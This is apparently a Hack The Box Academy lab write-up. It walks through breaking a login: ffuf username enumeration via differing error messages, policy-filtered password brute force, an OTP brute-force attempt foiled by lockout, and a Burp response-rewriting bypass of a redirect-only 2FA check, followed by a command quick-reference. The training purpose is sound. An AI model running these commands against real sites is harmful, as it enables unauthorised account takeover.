---
tags: [htb, broken-authentication, ffuf, user-enumeration, brute-force, 2fa-bypass, burp, web]
assessment: HTB Broken Authentication — Skills Assessment
type: academy
created: 2026-11-09
---

# Broken Authentication: Enumerate → Crack → Bypass 2FA

> [!summary] Core idea
> Three gates stand between you and the flag — an unknown username, an unknown password, and a 2FA prompt. The first two fall to brute force *because the app leaks which gate you failed*. The third doesn't fall to brute force at all (a lockout stops that), so you stop attacking the code and attack the **logic**: the 2FA check is enforced client-side via a redirect, and a redirect is only a suggestion.

---

## Step 1 — Enumerate a valid username

The login returns a different error for an unknown user than for a known user with a bad password. That difference is an oracle. Fuzz usernames with a bogus password and filter out the "unknown user" response — whatever survives the filter is a real account:

```shellsession
p3sta@htb[/htb]$ ffuf -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt \
  -u http://154.57.164.65:41869/login.php \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" -fr "Unknown username or password"
```

```
gladys    [Status: 200, Size: 4344, Words: 680, Lines: 91]
```

Valid username: **`gladys`**.

> [!warning] Mind the wordlist path
> `/opt/useful/seclists/...` is the path on HTB's Pwnbox; on a local Kali it's `/usr/share/wordlists/SecLists/...` (capital S, capital L). A `no such file or directory` error here is a path problem, not a tooling problem.

---

## Step 2 — Brute-force the password (policy-filtered wordlist)

The target enforces a password policy, so most of `rockyou` is wasted effort. Pre-filter to only passwords that *could* satisfy the policy (upper + lower + digit, min length), then fuzz the password with the known username:

```shellsession
p3sta@htb[/htb]$ ffuf -w ./filtered.txt \
  -u http://154.57.164.65:41869/login.php \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=gladys&password=FUZZ" -fr "Invalid credentials"
```

```
<REDACTED>    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 147ms]
:: Progress: [17048/17048] :: Job [1/1] :: 361 req/sec :: Duration: [0:00:50]
```

The real password returns **302** (redirect to the next step) while every failure returns 200 — a clean, unambiguous hit.

> [!tip] The filter string must match the response *exactly* — this is the whole game
> My first password runs returned **every** request as a "hit" because I filtered on `Invalid Credentials` and then `Invalid Credentials`, but the app's actual message was `Invalid credentials` (lowercase *c*). `-fr` is a regex match against the response; if it doesn't match the real error byte-for-byte, nothing gets filtered and ffuf hands you thousands of false positives. The moment the filter matched the true casing, the list collapsed to the single correct password. **When ffuf returns everything, your filter is wrong — go read the actual failure response.**

---

## Step 3 — The OTP wall (why brute force dies here)

Logging in with `gladys:<REDACTED>` lands on a 6-digit OTP prompt (`2fa.php`). Six digits = 1,000,000 candidates, so I generated the full space and fuzzed it:

```shellsession
p3sta@htb[/htb]$ seq -w 0 999999 > tokens.txt
p3sta@htb[/htb]$ ffuf -w ./tokens.txt \
  -u http://154.57.164.65:41869/2fa.php \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<session>" -d "otp=FUZZ" -fr "Invalid OTP"
```

A `302` appeared to flash by — but before trusting it, I went back and probed the OTP page manually. **After 3 wrong submissions, the app redirects back to `login.php`.** That lockout kills brute force: you can't push a million (or even a few dozen) guesses through a 3-attempt gate, and any ffuf "hit" past attempt 3 is an artifact of the lockout redirect, not a correct code.

> [!note] Check for rate limiting before you trust a brute-force result
> A lockout doesn't just slow you down — it invalidates the attack and can produce *false* hits (the redirect changes the response). Manually poking the endpoint revealed the 3-try limit that the raw ffuf output hid. Brute force was off the table; time to attack the logic instead.

---

## Step 4 — Bypass 2FA via response manipulation

The OTP gate is enforced by a **client-side redirect**: after the password step the server replies `302 → 2fa.php`, trusting the browser to go there. But the browser is mine. If I rewrite that response, I never visit the 2FA check at all. Using Burp (intercept **responses**):

1. Log in again with `gladys:<REDACTED>` and intercept the **response**. It's a `302` redirecting to `2fa.php` — change the `Location` to the post-authentication page (`profile.php`) and forward it.
2. That triggers the follow-up GET for the protected page. Intercept **its** response and change the status line from `302 Found` to `200 OK` so the browser renders the body instead of following another redirect.

The app never confirmed the OTP server-side — it only *redirected* to the prompt — so rewriting the redirect walks straight past it into an **Administrator** session, where the flag is waiting.

> [!info] Flag redacted
> This repo documents method, not answers.

---

## The chain in one line

**Differential login errors → enumerate `gladys` → policy-filtered password brute force (exact-match filter!) → OTP prompt → manual probing reveals a 3-attempt lockout → abandon brute force → rewrite the 302→2fa.php response in Burp to force-browse past the client-side 2FA check → admin account → flag.**

---

## Reusable takeaways

- [ ] **Different errors = a username oracle.** "Unknown user" vs "Invalid credentials" is all you need to enumerate accounts with `-fr`.
- [ ] **A 302 is a great success signal** when failures are 200s — filter on the error text, match on the redirect.
- [ ] **If ffuf returns *everything*, the filter is wrong.** The `-fr` string must match the real response exactly, casing included — read the actual failure body.
- [ ] **Filter the wordlist to the password policy** before spraying — skip candidates that can't possibly be valid.
- [ ] **Probe for rate limits/lockouts manually.** A 3-try cap makes OTP brute force not just slow but *invalid*, and can fake a hit.
- [ ] **2FA enforced by a redirect isn't enforced.** If the server trusts a client-side `Location` to gate access, rewrite the response (target + 302→200) and force-browse past it.

## Command quick-reference

```bash
# 1. Username enumeration
ffuf -w xato-net-10-million-usernames.txt -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" -fr "Unknown username or password"

# 2. Policy-filtered password brute force (exact-case filter string!)
ffuf -w ./filtered.txt -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=gladys&password=FUZZ" -fr "Invalid credentials"

# 3. OTP space (don't rely on this — 3-attempt lockout)
seq -w 0 999999 > tokens.txt

# 4. Bypass: Burp -> intercept RESPONSE -> Location 2fa.php => profile.php,
#    then next response 302 Found => 200 OK
```
